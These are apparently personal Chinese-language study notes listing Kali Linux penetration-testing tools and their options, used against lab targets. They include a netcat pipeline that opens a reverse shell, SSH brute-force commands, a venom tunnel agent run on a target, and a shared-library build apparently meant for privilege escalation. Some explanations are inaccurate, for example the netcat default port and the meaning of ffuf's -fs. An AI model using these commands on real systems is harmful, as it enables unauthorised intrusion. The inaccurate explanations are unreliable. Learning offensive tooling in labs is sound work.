

由于刚开始 ”玩“ 具体的命令使用和相关的工具参数不太熟悉，可能出现大量的基础的重复性的内容

==同时我认为，在学习kali的工具使用只需要知道你需要知道的使用方法原因如下：==

		1. kali工具太多，知道需要工具的大致用途即可，具体问Google即可。
		1. 更多的是学习渗透思路，工具只是思路的验证和实现。
		1. ==如果全面了解，掌握一个工具的使用花费时间太长，同时由于没有适合的训练场景难以掌握。==

# 漏洞利用工具

### metasploit

1. what?

    一款功能强大且广泛使用的渗透测试工具，提供了丰富的功能和模块，用户可以根据需要选择并配置合适的模块，从而实现自动化的渗透测试和攻击操作。

2. 具体实例

    1. 进入工具：输入`msfconsole`来进入交互页面
    2. 漏洞的扫描
        1. 寻找对于的==漏洞扫描模块==：`search keyword`：会返还相关的漏洞扫描模块
        2. 同`use`来加载模块
        3. `set`来进行参数设置
        4. `run`：来进行扫描
    3. 使用相关漏洞模块：`use path`，path为漏洞模块路径，然后就会进入漏洞模块的交互界面
    4. 查看需要配置的参数：`show options`
    5. 进行相关参数的设置：`set option value`：option为参数的名字，value为你设的值
    6. 进行攻击：`exploit`：在相关模块下输入，启动攻击模块
    7. 攻击完成后的会话管理
        1. 管理攻击对象：`sessions`：会列出所有的已经成功建立成功的回话
        2. 进入管理对象：`sessions -i value`：value为上一步session的标号。
        3. 退出管理对象：`sessions -K`：退出当前的会话。
    8. 获取数据：`getuid`：查看当前用户

# 扫描工具

## 主机发现

1. ### arping

    1. what?

        `arping`利用ARP协议来测试主机之间的连通性。通过发送ARP请求直接与目标主机进行通信。可以更准确地确定主机之间的连通性，而不受中间设备（如路由器）的干扰。而且它通常可以获得更快的响应时间。广泛支持，该工具在多个操作系统中都可用，包括Linux、Windows和macOS等。

        此外，`arping`仅适用于在同一局域网中测试主机之间的连通性，不能用于跨网络或互联网的连通性测试。

    2. 具体参数

        1. `for i in $(seq 0 10);do arping -c 2 10.1.1$i;done`
        2. 相关参数
            1. `-I, --interface <接口>`：指定要使用的网络接口。
            2. `-s, --source <源IP地址>`：指定发送ARP请求的源IP地址。
            3. `-c, --count <次数>`：指定发送ARP请求的次数。
            4. `-w, --timeout <超时时间>`：指定等待ARP响应的超时时间。
            5. `-D, --duplicate`：允许发送重复的ARP请求。
            6. `-U, --unicast`：使用单播模式发送ARP请求。


### arp-scan

1. what?

    是一个用于在局域网中扫描IP和MAC地址的命令。

2. 具体实例

    1. arp-scan -l

        `-l`选项用于告诉arp-scan打印完整的结果列表，包括IP地址、MAC地址和设备制造商信息

### nmap：

1. what?

    广泛用于网络发现、端口扫描、服务识别、漏洞检测和网络映射等任务

2. 具体实例

     

    1. nmap -p- -sV -A 192.168.195.24
        1. -p-：-p是表示扫描指定的端口，但是-p-是一种简单写法，等价于 “ -p 1-65535 ”
        2. -sV：探测服务/版本信息
        3. -A：相当于-sV,-sC,-O的组合。包含了1-10000端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测。
            1. 脚本扫描：自定义的定制脚本扫描，脚本目录：/usr/share/nmap/scripts
    2. nmap -Pn -sT -sV 192.168.1.1  192.168.1.2

        1. -Pn：nmap的扫描是会进行ping的，如果ping不同是不会进行扫的。而这个是表示就是ping不通，也要进行一一的扫描。
        2. -sT：通过tcp协议进行扫描
        3. 空格隔开ip，可以实现多个ip的扫描。
    3. -sC ：自动运行脚本扫描来获取更多关于目标主机的信息。
    4. -O：对目标主机进行操作系统识别，以确定目标主机正在运行的操作系统类型。
    5. -sU：进行udp的扫描，nmap默认是不对udp进行扫描的。

## web发现


### gobuster

1. what?

    Gobuster是一个扫描仪，寻找现有的或隐藏的Web对象。它通过对Web服务器发起字典攻击并分析。是通过那个go语言进行开发的，具有很好的性能，同时可以进行dns。但是kali并不自带，==需要下载==

2. 具体用途：

    1、目标站点中的URI（目录或文件）；,

    2、DNS子域名（支持通配符）；

    3、目标Web服务器的虚拟主机名（VHost）；

3. 具体的实例：

    1. **==gobuster dir -u==** **http://192.168.195.24/structure** ==**-w**== /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt ==**-x**== php,txt,html,js,php.bak,txt.bak,html.bak,json,git,jit.bak,zip,zip.bak **==--exclude-length==** 2899

        1. dir：表示是以文件模式，扫描目标url的文件夹。
        2. -u：指定扫描的url
        3. -w：指定攻击，爆破的字典：这个字典是不包含拓展名的，相当于“文件名.拓展名”的文件名，只包含文件名而不包含拓展名
        4. -x：表示在爆破的拓展名，php,txt,html等。

        ​		==注意==：这个命令中php.bak,txt.bak等，其中bak是表示的是相关的备份文件的后缀名

        1. **==--exclude-length==**: exclude the following content length (completely ignores the status). Supply multiple times to exclude multiple sizes.

         就是对爆破是返还的长度进行限制。来达到过滤的效果


### curl

1. what?

    ​		简单理解就是在终端上请求url，会将请求的相关的url的内容返还在终端。包括长度，内容等。

2. 具体实例：

    1. curl -L -i http://192.168.195.24/1.txt
        1. -L：HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。
        2. -i：打印出服务器回应的 HTTP 标头。



### searchsploit

1. what?

    ​      	SearchSploit为您提供了在本地保存的存储库中执行详细的离线搜索的能力。这种能力特别适用于在没有互联网接入的情况下对网络进行安全评估。许多漏洞都包含了二进制文件的链接，这些文件不包含在标准存储库中，但可以在我们的Exploit-DB二进制文件中找到。

    ​			==漏洞库==

2. 具体实例

    1. searchsploit fuel：查找本地的相关的fuel的关键字漏洞。单纯的相关包含这个字符串。



### nc

1. what?

    ​		返向连接的

2. 具体实例

    1. nc -nlvp 4444

        1. n：就是在反弹连接的时候，监听的主机直接只用ip进行直接连接，不在通过域名的解析。
        2. l：使用监听模式，管控传入的资料，想到于一直等待返向连接的主机的反弹shell
        3. v：显示命令的执行过程
        4. p：指定监听连接的端口。

    2. nc -nlvp 4444 > file
    
        ​	表示将监听到的数据写入到`file`中，这个命令可以实现文件的传输
    
    3. nc 192.168.195.170 < file
    
        ​	表示和`192.168.195.170`建立连接,并将`file`文件进行传输。
    
    4. nc 192.168.195.170 
    
        ​	就是和该ip建立一个tcp的通讯，这个通讯是可以有多种方式的。是连续的，是connect的。
    
        
    
    5. nc 192.168.195.170 3333 | /bin/bash | nc 192.168.170 4444
    
        1. nc 192.168.195.170 3333| /bin/bash
    
            `nc` 将尝试建立一个 TCP 连接到目标主机的默认端口（通常是 80 或 443）。这样，你可以与目标主机进行简单的网络通信，发送和接收数据。这时候本机就可以同`192.168.195.170`（kali）进行tcp的通讯，是可以持续连接的。也解释了为什么可以输入的个命令连续的测试。
    
            这样192.168.195.170（kali）的通讯信息会直接传入到  /bin/bash中。
    
        2. /bin/bash | nc 192.168.195.170 4444
    
            那么就可以将 `shell`的执行返回内容在次通过另一个端口返回给 192.168.195.170来展示。
    
    

### wget

1. what?

    是一个用于从==Web服务器下载文件==的命令行工具。它支持下载通过HTTP，HTTPS和FTP协议提供的文件，可以==递归下载整个目录==，支持断点续传等功能。wget通常用于从网站下载文件或在Linux系统中通过命令行下载软件包。在渗透测试和安全评估中，wget也可用于下==载利用和漏洞利用脚本，以及下载可能包含敏感信息的文件和文档。==

2. 具体实例

    1. wget url :即可





### ffuf

1. what?

    ==ffuf是一个快速的web路径和内容发现工具==，可以使用自定义字典和过滤规则来帮助你==发现隐藏的路径和文件==，进而进行漏洞扫描或其他安全测试。它可以使用多线程和协程的方式进行请求，速度很快，同时还可以支持代理，Cookies，HTTP认证等功能。在Kali中，ffuf已经被预装，并且支持常用的web服务发现和扫描。

2. 具体实例

    1. `ffuf -c -w ./dict.txt -u 'http://192.168.198.12?FUZZ=/etc' -fs 0,8`
        1. `-c`：表示对HTTP响应代码进行自动匹配和过滤，只显示有效的响应。
        2. `-w ./dict.txt`：指定字典文件，用于枚举URL路径
        3. `-u 'http://192.168.198.12?FUZZ=/etc'`：指定目标URL，其中 ==`FUZZ`是ffuf的关键词，代表需要替换的位置，这里用它替换了URL路径的一部分，即 `/etc`。ffuf会把字典中的每个元素替换到 `FUZZ` 位置并访问相应的URL。==
        4. `-fs 0,8`：过滤响应大小，这里表示只显示响应大小在0到8字节之间的结果。这个参数可以帮助过滤掉不必要的响应。==一般是初次扫过后，大致判断无用的响应后的大小再过滤==。
    2. `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -w /root/桌面/6/ffuf_dic:VAL -u http://192.168.195.171/secret/evil.php?PARAM=VAL -fs 0`
        1. `-w /dict:NAME`：这里面的NAME是对字典进行重命名的。



### dirsearch

1. what?

    来获取目标网站的相关后台

2. 具体实例

    1. dirsearch -u http://192.168.195.5:500

        ​	-u:指定url



# 爆破工具

### seclists

1. what?		[==返回==](#back2)<a id='tag2'></a>

    ==要安装==。在 Kali Linux 中，SecLists 字典集合通常位于 `/usr/share/seclists/` 目录下

2. 具体字典

    1. seclists/Discovery/Web-Content/burp-parameter-names.txt

        是burpsuit下的网页请求常见的参数名

    2. seclists/Discovery/Web-Content/directory-list-1.0.txt

        常见的web网页目录字典

### john

1. what?

    ​	是一个开源密码破解工具，支持多种密码哈希算法

2. 具体实例

    1. john -w password.txt encode.txt

        -w是用来指定密码字典，后面的encode.txt是包含需要进行解密的文件。

    2. 


### hydra

1. what?

    用于==密码破解网络登录==蛮力攻击工具。通过用户名和密码字典进行暴力破解。还支持暴==力破解登录页面中的表单==，具有高度可定制化和灵活性。此外，用户还可以在攻击前对==目标主机进行端口扫描==，以确认要攻击的服务端口。Medusa也支持多线程破解，

2. 具体实例

    1. hydra -L user.txt -P password.txt ssh://192.168.195.28
        1. -L/-l：用于指定登陆的用户
        2. -P/-p：用于指定密码。
        3. ssh://：按这个格式来

### medusa

1. what?

    用于==密码破解网络登录==蛮力攻击工具。通过用户名和密码字典进行暴力破解。还支持暴==力破解登录页面中的表单==，具有高度可定制化和灵活性。此外，用户还可以在攻击前对==目标主机进行端口扫描==，以确认要攻击的服务端口。Medusa也支持多线程破解，

    

2. 具体实例：
    1. medusa -h 192.168.232.138 -u zhangsan -P /root/passwd.txt -M ssh
        1. -h：指定ip
        1. -P：表示指定攻击字典
        1. -M：`-M` 参数用于指定要进行的==攻击模块==（或者说协议模块），并不是简单的指定攻击的协议类型

### crunch

1. what?

    ​	一款用于生成自定义密码列表的工具

2. 具体实例

    1. crunch 6 6 dfsafsaf  >> dic.txt
        1. 6 6 指定生成密码的长度
        2. dfsafsaf：指定字符集，==会自动的处理为集合的==



# 信息收集

### locate

1. what?

    ​	定位文件用的

2. 具体实例

    1. locate file_name

        就可以的返回file_name的文件路径。

### uname

1. what?

    是一个用于获取系统信息的命令。它用于显示有关操作系统的信息，包括内核版本、操作系统类型、计算机名称等。

2. 具体实例

    - `-a`：显示所有可用的系统信息，包括内核名称、主机名称、操作系统版本等。

    - `-s`：显示操作系统的名称。

    - `-n`：显示计算机的主机名称。

    - `-r`：显示内核的版本号。

    - `-v`：显示内核的发行版本。

    - `-m`：显示计算机的硬件架构。

    - `-p`：显示处理器类型。

    - `-o`：显示操作系统的制造商

### id 

1. what?

    显示当前用户的身份信息。它显示有关用户和组的详细信息，包括用户 ID（UID）、组 ID（GID）、附属组、用户和组的名称等。

2. 具体实例

    - `uid`：当前用户的用户 ID。
    - `gid`：当前用户的组 ID。
    - `groups`：当前用户所属的附属组列表。
    - `username`：当前用户的用户名。

    ![image-20230518102721947](http://image.cchl.fun/kali_image/image-20230518102721947.png)



# 其他

### sqlite3

1. what？

    ​	SQLite 是一个软件库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。SQLite 是在世界上最广泛部署的 	SQL 数据库引擎。SQLite 源代码不受版权限制。

2. 具体使用

    1. `.open db.sql` ：如果数据库存在则直接会打开，不存在就创建它。
    2. `.database`：查看已经存在的数据库。
    3. `.dump`：导出完整的数据库数据，可以追加`> `来将其导入到文本文件中。

### venom

1. what?

    用于内网渗透的代理脚本

2. 具体实例：相情见1.md的渗透过程。

    在GitHub上下载release的，admin开头的是在本机运行（），agent是在内网选择的代理的主机上运行的，具体使用方法可以命令的提示来执行，但是注意（一定要选择一个正确的，符合主机架构的版本就可以了，不是都有执行。只选一个就可以了）

    ![image-20230516000841296](http://image.cchl.fun/kali_image/image-20230516000841296.png)

    1. ./admin_linux_x64 -lport 9999

        本地选择适合本机系统的的admin开头的脚本，同时指定监听端口。==在本地执行==

    2. ./agent_linux_x64 -rhost 192.168.195.170 -rprot 9999；

        这是==在靶机上执行==的，需要自己上载。来指定反连的ip和端口
    
        
    
        （这里我将agent_linux_x64改名为agent,是为传输方便。）
    
        ![image-20230515190939081](http://image.cchl.fun/kali_image/image-20230515190939081.png)
    
    3. 在venom的监听界面下输入 
    
        1. show：会显示成功建立隧道的个数，
    
        2. goto 1：表示接下来对1隧道进行操作
    
        3. socks 1080：表示代理将通过本地的1080端口进行转发。也就是指定转发端口。
    
            <img src="http://image.cchl.fun/kali_image/image-20230515192045538.png" alt="image-20230515192045538" style="zoom: 50%;" />

### grep

1. what
2. 具体实例：
    1. -v：过滤相关的参数，不显示他。`grep / -v chen`。不显示chen相关的参数。

### vi

1. what？

    文本编辑器

2. 具体实例

    1. 命令模式下：
        1. shift+j：删除回车

### vim

1. what?

    ​	文本编辑器

2. 具体实例

    1. `：1,$d`

        `1`表示从第一行开始，`$`表示到最后一行结束，`d`表示删除
    
    2. `：dd`
    
        该命令将删除当前行并将其存储在剪贴板中
    
    3. `撤销`
    
        键盘上的`u`键即可执行撤销操作。同时，可以使用CTRL+R组合键来恢复被撤销的操作。
    
    4. `：set number`：
    
        显示行号

### gcc

1. what?

    C语言的 一个编译器

2. 具体实例：

    1. gcc -o name c_code.c：  `name`编译后的文件名，`c_code.c`需要编译的c文件

    2. gcc -o name c_code.c  -Ldir /tmp/csoc.so ：

        `-Ldir` 选项用于指定编译器在 `dir` 目录中查找库文件，它告诉编译器将目录 `dir` 添加到链接器的库搜索路径中。如果源代码中包含了对库函数的调用，链接器就可以在指定的目录中查找并链接相应的库文件。这个选项通常与 `-l` 选项一起使用，例如 `-L/usr/lib -lmysqlclient` 表示在 `/usr/lib` 目录中查找 `libmysqlclient.a` 或 `libmysqlclient.so` 库文件并链接到程序中	
    
    3. gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w
    
        1. `-fPIC`: 这个选项告诉编译器生成位置无关代码（Position Independent Code），以便库可以在内存中的不同位置加载和执行。这在共享对象库中是必需的。
        2. `-shared`: 这个选项告诉编译器生成一个共享对象库而不是可执行文件。
        3. `-ldl`: 这个选项告诉编译器链接动态加载器库（dynamic loader library）。动态加载器库（通常是`libdl`）包含用于在运行时加载共享对象库的函数。
        4. `-w`: 这个选项告诉编译器禁用警告信息的输出。它会抑制编译器生成任何警告的输出。
        5. `-fPIC,-ldl这`：两个参数一起使用，可以确保生成的共享对象库包含了位置无关代码，并能正确地与动态加载器库进行链接，使得该共享对象库可以在不同的程序中加载和使用。
    
    
    
    
    
    ### openssl
    
    1. what?
    
        提供了一组用于进行安全通信的加密和解密功能，以及用于生成和管理数字证书的工具。它支持各种密码算法、密钥交换协议和安全协议，包括 SSL/TLS 协议。
    
    2. 具体实例
    
        1. openssl passwd -1：
    
            表示进行MD5加密，回车后会让你输入相关的密码进行加密。
    
            `-1`：使用基于 md5 的哈希算法
    
            `-5`：使用基于 SHA-256 的哈希算法。
    
            `-6`：使用基于 SHA-512 的哈希算法。
    
    
    
    













